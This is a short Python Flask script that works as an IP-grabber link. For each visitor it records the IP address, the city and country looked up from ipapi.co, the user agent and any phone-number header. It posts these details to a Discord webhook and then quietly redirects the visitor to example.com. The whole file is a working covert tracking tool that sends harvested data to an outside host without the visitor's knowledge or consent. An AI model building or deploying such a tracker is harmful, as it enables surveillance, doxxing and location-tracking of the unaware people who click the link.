from flask import Flask, request, redirect
import requests
from datetime import datetime
from threading import Timer

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
logged_ips = set()

def get_real_ip():
    # Get IP from X-Forwarded-For or remote_addr
    xff = request.headers.get("X-Forwarded-For", "").split(",")
    return xff[0].strip() if xff else request.remote_addr

def get_visitor_info(ip, user_agent):
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Received status code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Exception: {e}")

    # Attempt to capture phone number from user-agent headers or elsewhere (e.g., custom headers)
    phone_number = request.headers.get("X-Phone-Number", "Not Provided")

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "city": details.get("city", "Unknown City"),
        "phone_number": phone_number,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    embed = {
        "username": "Visitor Info",
        "embeds": [{
            "title": f"Visitor From {info['country']}",
            "fields": [
                {"name": "IP & City", "value": f"{info['ip']} ({info['city']})"},
                {"name": "Phone Number", "value": info["phone_number"]},
                {"name": "User Agent", "value": info["user_agent"]},
            ],
            "footer": {"text": f"Time: {info['date']} {info['time']}"}
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=embed)

def clear_logged_ips():
    logged_ips.clear()
    Timer(3600, clear_logged_ips).start()

clear_logged_ips()

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")
    
    if ip not in logged_ips:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)
    
    # Redirect to another URL after processing
    return redirect("https://example.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
